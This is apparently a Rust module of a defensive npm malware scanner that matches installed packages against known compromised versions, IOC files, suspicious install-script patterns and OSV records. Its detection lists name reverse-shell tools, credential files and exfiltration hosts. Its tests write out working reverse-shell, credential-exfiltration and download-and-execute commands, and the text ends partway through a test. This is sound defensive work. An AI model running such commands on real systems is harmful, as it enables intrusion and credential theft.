//! npm supply chain scan: are any of the installed packages malicious?
//!
//! Three independent signals are looked for:
//! 1. **Known incidents**: an embedded list (`KNOWN`) of packages that were
//!    compromised and had a malicious version published. An exact name +
//!    version match is a definite finding.
//! 2. **IOC files**: files that known worms drop into the package directory.
//! 3. **Suspicious install scripts**: patterns such as download-and-execute
//!    or reading credentials inside `preinstall` / `install` / `postinstall`.
//!    This is heuristic; not a verdict, but a "take a look" warning.
//!
//! An optional fourth source is the OSV.dev database (`--online`): the names
//! and versions of installed packages are queried, and records starting with
//! `MAL-` are reported. The embedded list goes stale over time; up-to-date
//! coverage comes from here.
//!
//! The scan is read-only: only `package.json` files are read, and no package
//! code is ever executed.

use crate::osv;
use crate::progress::Progress;
use crate::runner::CommandRunner;
use colored::Colorize;
use serde::Serialize;
use serde_json::Value;
use std::collections::{BTreeMap, BTreeSet};
use std::fmt::Write as _;
use std::path::{Path, PathBuf};

/// A package that had a malicious version published. If `versions` is empty
/// the whole package is malicious (e.g. typosquat packages created solely
/// for an attack).
struct Incident {
    name: &'static str,
    versions: &'static [&'static str],
    note: &'static str,
}

const fn incident(name: &'static str, versions: &'static [&'static str], note: &'static str) -> Incident {
    Incident { name, versions, note }
}

const CHALK_DEBUG: &str = "September 2025 chalk/debug compromise (crypto wallet stealer)";
const SCAVENGER: &str = "July 2025 compromise via phishing (Scavenger malware)";
const NX: &str = "August 2025 Nx 's1ngularity' (token and wallet stealer)";
const RSPACK: &str = "December 2024 compromise (crypto miner)";
const TYPOSQUAT: &str = "typosquat (steals environment variables)";

/// Known incidents. The list is not exhaustive; it contains widespread and
/// well-documented cases. Use `--online` for up-to-date coverage.
const KNOWN: &[Incident] = &[
    incident(
        "event-stream",
        &["3.3.6"],
        "2018 flatmap-stream backdoor (wallet stealer)",
    ),
    incident(
        "flatmap-stream",
        &[],
        "malicious dependency of the 2018 event-stream attack",
    ),
    incident("eslint-scope", &["3.7.2"], "2018 npm token stealer"),
    incident("eslint-config-eslint", &["5.0.2"], "2018 npm token stealer"),
    incident(
        "ua-parser-js",
        &["0.7.29", "0.8.0", "1.0.0"],
        "2021 compromise (miner + password stealer)",
    ),
    incident(
        "coa",
        &["2.0.3", "2.0.4", "2.1.1", "2.1.3", "3.0.1", "3.1.3"],
        "2021 compromise (password stealer)",
    ),
    incident("rc", &["1.2.9", "1.3.9", "2.3.9"], "2021 compromise (password stealer)"),
    incident("node-ipc", &["10.1.1", "10.1.2"], "2022 protestware (file wiper)"),
    incident("peacenotwar", &[], "2022 protestware (writes a file to the desktop)"),
    incident(
        "colors",
        &["1.4.1", "1.4.2", "1.4.44-liberty-2"],
        "2022 sabotage (infinite loop)",
    ),
    incident("faker", &["6.6.6"], "2022 sabotage (gutted release)"),
    incident(
        "@solana/web3.js",
        &["1.95.6", "1.95.7"],
        "December 2024 compromise (private key stealer)",
    ),
    incident(
        "@lottiefiles/lottie-player",
        &["2.0.5", "2.0.6", "2.0.7"],
        "October 2024 compromise (wallet drainer)",
    ),
    incident("@rspack/core", &["1.1.7"], RSPACK),
    incident("@rspack/cli", &["1.1.7"], RSPACK),
    incident(
        "vant",
        &[
            "2.13.3", "2.13.4", "2.13.5", "3.6.13", "3.6.14", "3.6.15", "4.9.11", "4.9.12", "4.9.13", "4.9.14",
        ],
        RSPACK,
    ),
    incident(
        "xrpl",
        &["2.14.2", "4.2.1", "4.2.2", "4.2.3", "4.2.4"],
        "April 2025 compromise (private key stealer)",
    ),
    incident(
        "eslint-config-prettier",
        &["8.10.1", "9.1.1", "10.1.6", "10.1.7"],
        SCAVENGER,
    ),
    incident("eslint-plugin-prettier", &["4.2.2", "4.2.3"], SCAVENGER),
    incident("synckit", &["0.11.9"], SCAVENGER),
    incident("@pkgr/core", &["0.2.8"], SCAVENGER),
    incident("napi-postinstall", &["0.3.1"], SCAVENGER),
    incident("got-fetch", &["5.1.11", "5.1.12"], SCAVENGER),
    incident("is", &["3.3.1", "5.0.0"], SCAVENGER),
    incident(
        "nx",
        &[
            "20.9.0", "20.10.0", "20.11.0", "20.12.0", "21.5.0", "21.6.0", "21.7.0", "21.8.0",
        ],
        NX,
    ),
    incident("chalk", &["5.6.1"], CHALK_DEBUG),
    incident("debug", &["4.4.2"], CHALK_DEBUG),
    incident("ansi-styles", &["6.2.2"], CHALK_DEBUG),
    incident("ansi-regex", &["6.2.1"], CHALK_DEBUG),
    incident("strip-ansi", &["7.1.1"], CHALK_DEBUG),
    incident("wrap-ansi", &["9.0.1"], CHALK_DEBUG),
    incident("slice-ansi", &["7.1.1"], CHALK_DEBUG),
    incident("has-ansi", &["6.0.1"], CHALK_DEBUG),
    incident("supports-color", &["10.2.1"], CHALK_DEBUG),
    incident("supports-hyperlinks", &["4.1.1"], CHALK_DEBUG),
    incident("chalk-template", &["1.1.1"], CHALK_DEBUG),
    incident("color", &["5.0.1"], CHALK_DEBUG),
    incident("color-convert", &["3.1.1"], CHALK_DEBUG),
    incident("color-name", &["2.0.1"], CHALK_DEBUG),
    incident("color-string", &["2.1.1"], CHALK_DEBUG),
    incident("simple-swizzle", &["0.2.3"], CHALK_DEBUG),
    incident("is-arrayish", &["0.3.3"], CHALK_DEBUG),
    incident("error-ex", &["1.3.3"], CHALK_DEBUG),
    incident("backslash", &["0.2.1"], CHALK_DEBUG),
    incident(
        "@ctrl/tinycolor",
        &["4.1.1", "4.1.2"],
        "September 2025 Shai-Hulud worm (token stealer)",
    ),
    incident(
        "axios",
        &["1.14.1", "0.30.4"],
        "March 2026 compromise (remote access trojan)",
    ),
    incident(
        "plain-crypto-js",
        &[],
        "malicious dependency of the March 2026 axios attack",
    ),
    incident("crossenv", &[], TYPOSQUAT),
    incident("cross-env.js", &[], TYPOSQUAT),
    incident("mongose", &[], TYPOSQUAT),
    incident("babelcli", &[], TYPOSQUAT),
    incident("getcookies", &[], "2018 backdoor"),
];

/// Files whose mere presence in the package root counts as an indicator.
const IOC_FILES: &[(&str, &str)] = &[
    ("setup_bun.js", "loader file of the Shai-Hulud 2.0 worm"),
    ("bun_environment.js", "payload file of the Shai-Hulud 2.0 worm"),
];

/// Scripts that run automatically during installation.
const LIFECYCLE: [&str; 3] = ["preinstall", "install", "postinstall"];

/// A `package.json` larger than this is not read (ordinary files are a few KB).
const MAX_MANIFEST_BYTES: u64 = 2 * 1024 * 1024;

/// Recursion limit for nested `node_modules`.
const MAX_NESTING: usize = 40;

/// Number of sample locations kept per finding.
const MAX_PATHS: usize = 3;

/// The kind of finding. Ordered by importance (most serious first).
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize)]
#[serde(rename_all = "kebab-case")]
pub enum Kind {
    /// A malicious version from the embedded list.
    Known,
    /// OSV.dev has a malicious package (`MAL-`) record.
    Osv,
    /// A file dropped by known malware.
    IocFile,
    /// Suspicious install script (heuristic).
    Script,
    /// A `package.json` too large to read, so the package was not checked.
    Unread,
}

impl Kind {
    /// Is this a definite finding (not a warning)?
    pub fn is_malware(self) -> bool {
        matches!(self, Kind::Known | Kind::Osv | Kind::IocFile)
    }

    pub(crate) fn label(self) -> &'static str {
        match self {
            Kind::Known => "MALICIOUS VERSION",
            Kind::Osv => "OSV RECORD",
            Kind::IocFile => "IOC FILE",
            Kind::Script => "SUSPICIOUS SCRIPT",
            Kind::Unread => "NOT CHECKED",
        }
    }

    /// What to do about a finding of this kind.
    pub fn advice(self) -> &'static str {
        match self {
            Kind::Known | Kind::Osv | Kind::IocFile => {
                "Remove the package or move to a clean version, reinstall node_modules, and rotate the npm, GitHub and cloud credentials on this Mac."
            }
            Kind::Script => "Heuristic warning: read the install script and decide.",
            Kind::Unread => {
                "Its package.json is too large to read, so the package was not checked against the malware list: look at it by hand."
            }
        }
    }
}

/// A single finding. If the same package is installed in many projects it is
/// collapsed into one finding.
#[derive(Debug, Clone, Serialize)]
pub struct Finding {
    pub kind: Kind,
    pub package: String,
    pub version: String,
    pub reason: String,
    /// Number of installs where the finding was seen.
    pub count: usize,
    /// The first few locations.
    pub paths: Vec<PathBuf>,
}

/// (name, version) → the directory where it was first seen.
pub type Installed = BTreeMap<(String, String), PathBuf>;

/// The result of a scan.
#[derive(Debug, Default, Serialize)]
pub struct Scan {
    pub roots: Vec<PathBuf>,
    /// Number of package installs inspected (the same package in different
    /// places is counted separately).
    pub packages: usize,
    pub findings: Vec<Finding>,
    /// The unique (name, version) pairs seen and where each was first seen;
    /// for the OSV query.
    #[serde(skip)]
    pub installed: Installed,
}

impl Scan {
    pub fn malware(&self) -> impl Iterator<Item = &Finding> {
        self.findings.iter().filter(|finding| finding.kind.is_malware())
    }

    /// Warnings: suspicious install scripts and packages that were not checked.
    pub fn suspicious(&self) -> impl Iterator<Item = &Finding> {
        self.findings.iter().filter(|finding| !finding.kind.is_malware())
    }

    /// Packages whose manifest could not be read, so they were not checked.
    pub fn unread(&self) -> impl Iterator<Item = &Finding> {
        self.findings.iter().filter(|finding| finding.kind == Kind::Unread)
    }

    /// Looks the installed packages up in OSV and adds the malicious package
    /// records found. If a request failed, the records found before it are
    /// still added and the error is returned, so the scan reads as incomplete.
    pub fn lookup_osv(&mut self, progress: &Progress) -> Result<(), String> {
        let (hits, error) = osv_lookup_with(&self.installed, progress);
        self.add_osv(hits);
        error.map_or(Ok(()), Err)
    }

    /// Adds OSV results to the findings. Packages already caught by the
    /// embedded list are not duplicated.
    pub fn add_osv(&mut self, hits: Vec<OsvHit>) {
        for hit in hits {
            let already_known = self.findings.iter().any(|finding| {
                finding.kind == Kind::Known && finding.package == hit.package && finding.version == hit.version
            });
            if already_known {
                continue;
            }
            let key = (hit.package, hit.version);
            self.findings.push(Finding {
                kind: Kind::Osv,
                reason: format!("OSV malicious package record: {}", hit.ids.join(", ")),
                package: key.0.clone(),
                version: key.1.clone(),
                count: 1,
                paths: self.installed.get(&key).cloned().into_iter().collect(),
            });
        }
        self.findings
            .sort_by(|a, b| (a.kind, &a.package, &a.version).cmp(&(b.kind, &b.package, &b.version)));
    }
}

// ---- Scanning ----

/// Scans the given `node_modules` directories.
pub fn scan(roots: &[PathBuf]) -> Scan {
    scan_with(roots, &Progress::none())
}

/// Like `scan`, reporting each directory as it is finished.
pub fn scan_with(roots: &[PathBuf], progress: &Progress) -> Scan {
    progress.stage(format!("Inspecting {} node_modules directories", roots.len()));
    let mut scanner = Scanner::default();
    for (index, root) in roots.iter().enumerate() {
        progress.note(format!("{} ({} packages so far)", root.display(), scanner.packages));
        scanner.node_modules(root, 0);
        progress.step(index + 1, roots.len());
    }

    let findings = scanner
        .hits
        .into_iter()
        .map(|((kind, package, version, reason), (count, paths))| Finding {
            kind,
            package,
            version,
            reason,
            count,
            paths,
        })
        .collect();

    Scan {
        roots: roots.to_vec(),
        packages: scanner.packages,
        findings,
        installed: scanner.installed,
    }
}

/// (kind, package, version, reason) → (install count, sample locations).
/// `BTreeMap` keeps entries sorted by key: findings come out in order of
/// importance.
type Hits = BTreeMap<(Kind, String, String, String), (usize, Vec<PathBuf>)>;

#[derive(Default)]
struct Scanner {
    packages: usize,
    installed: Installed,
    hits: Hits,
}

impl Scanner {
    /// Walks the packages in a `node_modules` directory.
    fn node_modules(&mut self, dir: &Path, depth: usize) {
        for (name, path) in subdirs(dir) {
            if name == ".pnpm" || name == ".bun" || name == ".store" {
                // pnpm, Bun and npm `install-strategy=linked` stores:
                // `.pnpm/<name>@<version>/node_modules/<package>`; the packages
                // in place are links into the store, which are not followed.
                for (entry, store_entry) in subdirs(&path) {
                    if entry.starts_with('@') {
                        // npm keeps scoped packages one level down:
                        // `.store/@scope/<name>@<version>-<hash>/node_modules/…`
                        for (_, scoped_entry) in subdirs(&store_entry) {
                            self.node_modules(&scoped_entry.join("node_modules"), depth);
                        }
                    } else {
                        self.node_modules(&store_entry.join("node_modules"), depth);
                    }
                }
            } else if name.starts_with('.') {
                // `.bin`, `.cache`, `.package-lock.json`, etc.
            } else if name.starts_with('@') {
                // Scoped packages live one level down: `@scope/name`
                for (_, scoped) in subdirs(&path) {
                    self.package(&scoped, depth);
                }
            } else {
                self.package(&path, depth);
            }
        }
    }

    /// Inspects a single package directory, then descends into its own
    /// `node_modules`.
    fn package(&mut self, dir: &Path, depth: usize) {
        match read_manifest(&dir.join("package.json")) {
            Ok(Some(manifest)) => self.inspect(dir, &manifest),
            Ok(None) => {}
            // npm installs a package whatever the size of its manifest, so a
            // padded one must not hide the package: say it was not checked.
            Err(size) => {
                let reason = format!(
                    "package.json is {} MB, over the {} MB this scan reads; check the package by hand",
                    size.div_ceil(1024 * 1024),
                    MAX_MANIFEST_BYTES / (1024 * 1024)
                );
                self.hit(Kind::Unread, &package_name(dir), "", reason, dir);
            }
        }
        if depth < MAX_NESTING {
            self.node_modules(&dir.join("node_modules"), depth + 1);
        }
    }

    fn inspect(&mut self, dir: &Path, manifest: &Value) {
        let text = |key: &str| manifest.get(key).and_then(Value::as_str).unwrap_or_default();
        let (name, version) = (text("name"), text("version"));
        if name.is_empty() {
            // Helper `package.json` files inside a package (e.g. `{"type":"module"}`).
            return;
        }
        self.packages += 1;
        self.installed
            .entry((name.to_string(), version.to_string()))
            .or_insert_with(|| dir.to_path_buf());

        if let Some(note) = known_incident(name, version) {
            self.hit(Kind::Known, name, version, note.to_string(), dir);
        }

        for (file, note) in IOC_FILES {
            if dir.join(file).is_file() {
                self.hit(Kind::IocFile, name, version, format!("{file}: {note}"), dir);
            }
        }

        for hook in LIFECYCLE {
            let script = manifest
                .get("scripts")
                .and_then(|scripts| scripts.get(hook))
                .and_then(Value::as_str);
            if let Some(reason) = script.and_then(script_suspicion) {
                self.hit(Kind::Script, name, version, format!("{hook}: {reason}"), dir);
            }
        }
    }

    fn hit(&mut self, kind: Kind, name: &str, version: &str, reason: String, dir: &Path) {
        let key = (kind, name.to_string(), version.to_string(), reason);
        let (count, paths) = self.hits.entry(key).or_default();
        *count += 1;
        if paths.len() < MAX_PATHS {
            paths.push(dir.to_path_buf());
        }
    }
}

/// Returns the directory's subdirectories as sorted (name, path) pairs.
/// Symbolic links are not followed: pnpm's links are already scanned under
/// `.pnpm`, and this removes any risk of looping. Unreadable directories
/// count as empty.
fn subdirs(dir: &Path) -> Vec<(String, PathBuf)> {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return Vec::new();
    };
    let mut dirs: Vec<(String, PathBuf)> = entries
        .filter_map(Result::ok)
        // `DirEntry::file_type` does not follow links; links are filtered out here.
        .filter(|entry| entry.file_type().is_ok_and(|kind| kind.is_dir()))
        .map(|entry| (entry.file_name().to_string_lossy().into_owned(), entry.path()))
        .collect();
    dirs.sort();
    dirs
}

/// Reads a `package.json`: `Ok(None)` when there is none or it is not JSON,
/// `Err(size)` when it is too large to read.
fn read_manifest(path: &Path) -> Result<Option<Value>, u64> {
    let Ok(metadata) = std::fs::metadata(path) else {
        return Ok(None);
    };
    if metadata.len() > MAX_MANIFEST_BYTES {
        return Err(metadata.len());
    }
    let Ok(text) = std::fs::read_to_string(path) else {
        return Ok(None);
    };
    // npm and Node strip a leading UTF-8 BOM, so such a package installs and
    // runs its scripts; it must not slip past the scan.
    Ok(serde_json::from_str(text.strip_prefix('\u{feff}').unwrap_or(&text)).ok())
}

/// The package name a directory under `node_modules` stands for
/// (`@scope/name` for scoped packages).
fn package_name(dir: &Path) -> String {
    let name = |path: &Path| path.file_name().unwrap_or_default().to_string_lossy().into_owned();
    match dir.parent().map(name) {
        Some(scope) if scope.starts_with('@') => format!("{scope}/{}", name(dir)),
        _ => name(dir),
    }
}

/// Returns the description if the package and version match a known incident.
fn known_incident(name: &str, version: &str) -> Option<&'static str> {
    KNOWN
        .iter()
        .find(|incident| {
            incident.name == name && (incident.versions.is_empty() || incident.versions.contains(&version))
        })
        .map(|incident| incident.note)
}

/// Returns the reason if the install script looks suspicious.
///
/// The mere existence of an install script is not suspicious (many packages
/// such as esbuild and sharp use one to download binaries); only patterns
/// that would not be expected in a legitimate install are looked for here.
fn script_suspicion(script: &str) -> Option<&'static str> {
    let lower = script.to_lowercase();
    let has = |patterns: &[&str]| patterns.iter().any(|pattern| lower.contains(pattern));

    let downloads = has(&["curl ", "wget "]);
    let piped = downloads && has(&["| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh"]);
    if piped || runs_substituted_download(&lower) {
        return Some("directly executes a script it downloads");
    }
    if has(&["/dev/tcp/", "nc -e ", "ncat -e "]) {
        return Some("contains a reverse shell pattern");
    }
    if lower.contains("base64") && has(&[" -d", "--decode"]) {
        return Some("runs a command obfuscated with base64");
    }
    if has(&["setup_bun.js", "bun_environment.js"]) {
        return Some("runs the loader of the Shai-Hulud 2.0 worm");
    }
    if has(&[
        "webhook.site",
        "pipedream.net",
        "discord.com/api/webhooks",
        "pastebin.com",
        "burpcollaborator",
        "oast.fun",
        "oastify.com",
        "interact.sh",
        "ngrok",
    ]) {
        return Some("connects to an address used for data exfiltration");
    }
    if has(&[".ssh/", ".npmrc", ".aws/", "/etc/passwd", "login.keychain", "id_rsa"]) {
        return Some("accesses credential files");
    }
    if has(&["node -e", "node --eval"]) && has(&["child_process", "eval(", "http"]) {
        return Some("runs a command or reaches the network with inline code");
    }
    if lower.contains("osascript") {
        return Some("runs a system command via osascript");
    }
    None
}

/// Does a command run what it downloads through command substitution, like
/// `curl … | sh` without the pipe? `sh -c "$(curl …)"`, `eval "$(curl …)"`,
/// `node -e "$(curl …)"`, `bash <(curl …)`, or a script that is nothing but
/// `$(curl …)`. Keeping the output in a variable (`ip=$(curl …)`) does not
/// count. Also used for launch items (`checks::persistence`).
pub(crate) fn runs_substituted_download(text: &str) -> bool {
    // What may stand right before the download for its output to be run
    // (`sh <(` also matches `bash <(` and `zsh <(`).
    // Single quotes do not stop it: `bash -c '$(curl …)'` hands the
    // substitution to the inner shell, which runs it.
    const RUNNERS: [&str; 12] = [
        "eval \"$(",
        "eval '$(",
        "eval $(",
        "-c \"$(",
        "-c '$(",
        "-c $(",
        "-e \"$(",
        "-e '$(",
        "-e $(",
        "sh <(",
        "source <(",
        ". <(",
    ];
    let script = text.trim().trim_start_matches(['"', '\'']);
    ["curl ", "wget "].iter().any(|tool| {
        script.starts_with(&format!("$({tool}"))
            || script.starts_with(&format!("`{tool}"))
            || RUNNERS.iter().any(|runner| text.contains(&format!("{runner}{tool}")))
    })
}

// ---- Finding the directories to scan ----

fn home() -> Option<PathBuf> {
    std::env::var_os("HOME").map(PathBuf::from)
}

/// Global install directories: npm, pnpm, yarn, bun, version managers and
/// the `npx` cache. Only the ones that exist are returned.
pub fn global_roots(runner: &dyn CommandRunner) -> Vec<PathBuf> {
    global_roots_checked(runner).0
}

/// Like `global_roots`, and also says why npm's own global directory could
/// not be determined, if `npm` is installed but did not answer. The fixed
/// locations are still returned then; a custom `prefix` would be missed.
pub fn global_roots_checked(runner: &dyn CommandRunner) -> (Vec<PathBuf>, Option<String>) {
    let mut problem = None;
    let mut candidates: Vec<PathBuf> = vec![
        PathBuf::from("/opt/homebrew/lib/node_modules"),
        PathBuf::from("/usr/local/lib/node_modules"),
    ];

    // If a custom `prefix` is set, the fixed paths above are not enough.
    match runner.run("npm", &["root", "-g"]) {
        Ok(out) if out.success && !out.stdout.is_empty() => candidates.push(PathBuf::from(out.stdout)),
        Ok(out) => {
            problem = Some(format!(
                "`npm root -g` failed: {}",
                out.combined().lines().next().unwrap_or("no output")
            ))
        }
        // The command could not be started: npm is not installed, which is
        // not a problem. Anything else (a timeout) is.
        Err(err) if err.contains("could not run") => {}
        Err(err) => problem = Some(err),
    }

    if let Some(home) = home() {
        // `*` stands for a single directory level (e.g. the Node version).
        const PATTERNS: [&str; 14] = [
            ".npm-global/lib/node_modules",
            ".npm/_npx/*/node_modules",
            ".nvm/versions/node/*/lib/node_modules",
            ".fnm/node-versions/*/installation/lib/node_modules",
            ".local/share/fnm/node-versions/*/installation/lib/node_modules",
            "Library/Application Support/fnm/node-versions/*/installation/lib/node_modules",
            ".volta/tools/image/node/*/lib/node_modules",
            ".volta/tools/image/packages/*/lib/node_modules",
            ".asdf/installs/nodejs/*/lib/node_modules",
            ".local/share/mise/installs/node/*/lib/node_modules",
            "Library/pnpm/global/*/node_modules",
            ".local/share/pnpm/global/*/node_modules",
            ".bun/install/global/node_modules",
            ".config/yarn/global/node_modules",
        ];
        for pattern in PATTERNS {
            candidates.extend(expand(&home, pattern));
        }
    }

    (unique_dirs(candidates), problem)
}

/// Global directories + the `node_modules` directories of projects in the
/// home directory.
pub fn all_roots(runner: &dyn CommandRunner) -> Vec<PathBuf> {
    let mut roots = global_roots(runner);
    if let Some(home) = home() {
        // Projects are not searched for in these folders at the root of the
        // home directory: they are large, and the global directories under
        // Library were already added above.
        const SKIP: [&str; 6] = ["Library", "Applications", "Music", "Movies", "Pictures", "Public"];
        roots.extend(find_node_modules(&home, &SKIP));
    }
    unique_dirs(roots)
}

/// Turns a user-supplied path into scan roots: the path itself if it is a
/// `node_modules`, otherwise every `node_modules` directory beneath it.
pub fn roots_under(path: &Path) -> Vec<PathBuf> {
    if path.file_name().is_some_and(|name| name == "node_modules") {
        return vec![path.to_path_buf()];
    }
    find_node_modules(path, &[])
}

/// Searches for `node_modules` directories under `base`. A found directory
/// is not descended into (the scanner walks nested ones itself); hidden
/// directories and symbolic links are skipped.
fn find_node_modules(base: &Path, skip_top: &[&str]) -> Vec<PathBuf> {
    /// Deep enough to reach monorepo sub-packages when starting from the
    /// home directory.
    const MAX_DEPTH: usize = 9;

    fn walk(dir: &Path, depth: usize, skip: &[&str], found: &mut Vec<PathBuf>) {
        for (name, path) in subdirs(dir) {
            if name == "node_modules" {
                found.push(path);
            } else if !name.starts_with('.') && !skip.contains(&name.as_str()) && depth < MAX_DEPTH {
                // The skip list applies only to the top level.
                walk(&path, depth + 1, &[], found);
            }
        }
    }

    let mut found = Vec::new();
    walk(base, 0, skip_top, &mut found);
    found
}

/// Expands a pattern of the form `a/*/b` into existing paths under `base`.
fn expand(base: &Path, pattern: &str) -> Vec<PathBuf> {
    let mut paths = vec![base.to_path_buf()];
    for part in pattern.split('/') {
        paths = paths
            .iter()
            .flat_map(|path| match part {
                "*" => subdirs(path).into_iter().map(|(_, child)| child).collect(),
                _ => vec![path.join(part)],
            })
            .collect();
    }
    paths
}

/// Resolves existing directories to their real paths and drops duplicates.
fn unique_dirs(candidates: Vec<PathBuf>) -> Vec<PathBuf> {
    let unique: BTreeSet<PathBuf> = candidates
        .into_iter()
        .filter_map(|path| path.canonicalize().ok())
        .filter(|path| path.is_dir())
        .collect();
    unique.into_iter().collect()
}

// ---- OSV.dev query (--online) ----

/// An installed version that has a malicious package record in OSV.
#[derive(Debug, PartialEq, Eq)]
pub struct OsvHit {
    pub package: String,
    pub version: String,
    pub ids: Vec<String>,
}

/// Queries OSV.dev about the installed packages, reporting each batch. Only
/// package names and versions are sent out; no file paths or contents are
/// sent. Returns the malicious package records found and, if a request
/// failed, why; what was found before the failure is kept.
pub fn osv_lookup_with(installed: &Installed, progress: &Progress) -> (Vec<OsvHit>, Option<String>) {
    // Packages without a version (e.g. installed from git) cannot be queried.
    let packages: Vec<&(String, String)> = installed.keys().filter(|(_, version)| !version.is_empty()).collect();

    progress.stage(format!("Asking OSV.dev about {} package versions", packages.len()));
    let queries: Vec<osv::Query> = packages
        .iter()
        .map(|(name, version)| osv::Query {
            ecosystem: "npm",
            name,
            version,
        })
        .collect();
    let (results, error) = osv::query(&queries, |done, total| progress.step(done, total));
    (malware_hits(&packages, results), error)
}

/// Vulnerability (GHSA/CVE) records are out of scope here; only `MAL-`
/// records are kept.
fn malware_hits(packages: &[&(String, String)], results: Vec<Vec<osv::Vuln>>) -> Vec<OsvHit> {
    packages
        .iter()
        .zip(results)
        .filter_map(|((name, version), vulns)| {
            let ids: Vec<String> = vulns
                .into_iter()
                .map(|vuln| vuln.id)
                .filter(|id| id.starts_with("MAL-"))
                .collect();
            (!ids.is_empty()).then(|| OsvHit {
                package: name.clone(),
                version: version.clone(),
                ids,
            })
        })
        .collect()
}

// ---- Report (--npm) ----

/// Output of the `--npm` mode.
#[derive(Debug, Serialize)]
pub struct NpmReport {
    pub tool: &'static str,
    pub version: &'static str,
    pub timestamp: String,
    /// Was the OSV query performed?
    pub online: bool,
    #[serde(flatten)]
    pub scan: Scan,
}

impl NpmReport {
    pub fn new(timestamp: String, online: bool, scan: Scan) -> Self {
        Self {
            tool: env!("CARGO_PKG_NAME"),
            version: env!("CARGO_PKG_VERSION"),
            timestamp,
            online,
            scan,
        }
    }

    pub fn to_json(&self) -> String {
        serde_json::to_string_pretty(self).expect("report is serializable to JSON")
    }

    pub fn to_text(&self) -> String {
        let mut out = String::new();
        let rule = "─".repeat(78).dimmed();
        let scan = &self.scan;
        let source = if self.online {
            "embedded list + OSV.dev"
        } else {
            "embedded list (use --online for up-to-date records)"
        };

        let _ = writeln!(out);
        let _ = writeln!(out, "{}", " npm Malicious Package Scan ".on_blue().white().bold());
        let _ = writeln!(
            out,
            " {} directories · {} package installs ({} unique versions) · {}",
            scan.roots.len(),
            scan.packages,
            scan.installed.len(),
            source.dimmed()
        );
        let _ = writeln!(out, "{rule}");

        for finding in &scan.findings {
            let label = format!("[{}]", finding.kind.label());
            let label = if finding.kind.is_malware() {
                label.red().bold()
            } else {
                label.yellow().bold()
            };
            let version = if finding.version.is_empty() {
                "?".to_string()
            } else {
                printable(&finding.version)
            };
            let _ = writeln!(out);
            let _ = writeln!(
                out,
                "{label} {}",
                format!("{}@{version}", printable(&finding.package)).bold()
            );
            let _ = writeln!(out, "    {}", printable(&finding.reason));
            for path in &finding.paths {
                let _ = writeln!(out, "    {}", printable(&path.display().to_string()).dimmed());
            }
            if finding.count > finding.paths.len() && !finding.paths.is_empty() {
                let more = finding.count - finding.paths.len();
                let _ = writeln!(out, "    {}", format!("… and {more} more locations").dimmed());
            }
        }

        let malware = scan.malware().count();
        let unread = scan.unread().count();
        let suspicious = scan.suspicious().count() - unread;
        let _ = writeln!(out);
        let _ = writeln!(out, "{rule}");
        if malware > 0 {
            let _ = writeln!(out, "{}", format!("{malware} malicious packages found.").red().bold());
            let _ = writeln!(
                out,
                "Remove the package or move to a clean version, delete and reinstall `node_modules`,\n\
                 and rotate the npm / GitHub / cloud keys and passwords on this machine."
            );
        } else {
            let _ = writeln!(out, "{}", "No known malicious packages found.".green().bold());
        }
        if suspicious > 0 {
            let _ = writeln!(
                out,
                "{}",
                format!(
                    "{suspicious} suspicious install scripts: this is a heuristic warning, read the script and decide."
                )
                .yellow()
            );
        }
        if unread > 0 {
            let _ = writeln!(
                out,
                "{}",
                format!("{unread} packages not checked: {}", Kind::Unread.advice()).yellow()
            );
        }
        if scan.roots.is_empty() {
            let _ = writeln!(out, "{}", "No node_modules directory found to scan.".dimmed());
        }
        out.trim_end().to_string()
    }
}

/// Names, versions and paths come from the scanned packages, which may be
/// malicious: control characters are shown escaped so that they cannot drive
/// the terminal (e.g. erase the warning line).
fn printable(text: &str) -> String {
    text.chars()
        .map(|c| {
            if c.is_control() {
                c.escape_default().to_string()
            } else {
                c.to_string()
            }
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Temporary directory removed when the test ends (via `Drop`).
    struct TempDir(PathBuf);

    impl TempDir {
        fn new(label: &str) -> Self {
            let dir = std::env::temp_dir().join(format!("swordcheck-npm-{label}-{}", std::process::id()));
            let _ = std::fs::remove_dir_all(&dir);
            std::fs::create_dir_all(&dir).unwrap();
            Self(dir)
        }

        /// Writes a package under `relative`.
        fn package(&self, relative: &str, manifest: Value) -> PathBuf {
            let dir = self.0.join(relative);
            std::fs::create_dir_all(&dir).unwrap();
            std::fs::write(dir.join("package.json"), manifest.to_string()).unwrap();
            dir
        }
    }

    impl Drop for TempDir {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    fn pkg(name: &str, version: &str) -> Value {
        serde_json::json!({ "name": name, "version": version })
    }

    #[test]
    fn known_version_matches_clean_version_does_not() {
        assert!(known_incident("chalk", "5.6.1").is_some());
        assert!(known_incident("chalk", "5.6.2").is_none());
        assert!(known_incident("chalk", "5.6.10").is_none());
        // Packages with an empty version list are malicious at every version.
        assert!(known_incident("flatmap-stream", "0.1.0").is_some());
        assert!(known_incident("express", "4.18.2").is_none());
    }

    #[test]
    fn known_list_is_consistent() {
        for (index, incident) in KNOWN.iter().enumerate() {
            assert!(
                KNOWN[..index].iter().all(|other| other.name != incident.name),
                "{} appears twice in the list",
                incident.name
            );
        }
    }

    #[test]
    fn ordinary_install_scripts_are_not_suspicious() {
        for script in [
            "node install.js",
            "node-gyp rebuild",
            "prebuild-install || node-gyp rebuild",
            "husky install",
            "node ./scripts/postinstall.js --base64",
            "patch-package",
            "node -e \"try{require('./postinstall')}catch(e){}\"",
            // Keeping a download's output is not running it.
            "VERSION=$(curl -s https://example.com/latest) node install.js",
        ] {
            assert_eq!(script_suspicion(script), None, "{script}");
        }
    }

    #[test]
    fn malicious_script_patterns_are_caught() {
        for script in [
            "curl -s https://example.com/x.sh | bash",
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            "echo aGk= | base64 -d | sh",
            "node setup_bun.js",
            "curl -d @package.json https://webhook.site/abc",
            "cat ~/.npmrc | nc example.com 80",
            "node -e \"require('child_process').exec('id')\"",
        ] {
            assert!(script_suspicion(script).is_some(), "{script}");
        }
    }

    #[test]
    fn download_run_through_substitution_is_caught() {
        // The same as `curl … | sh`, without the pipe.
        for script in [
            "sh -c \"$(curl -fsSL https://example.com/i.sh)\"",
            "bash -c \"$(wget -qO- https://example.com/i.sh)\"",
            "bash -c '$(curl -s https://example.com/i.sh)'",
            "eval \"$(curl -s https://example.com/env)\"",
            "eval $(curl -s https://example.com/env)",
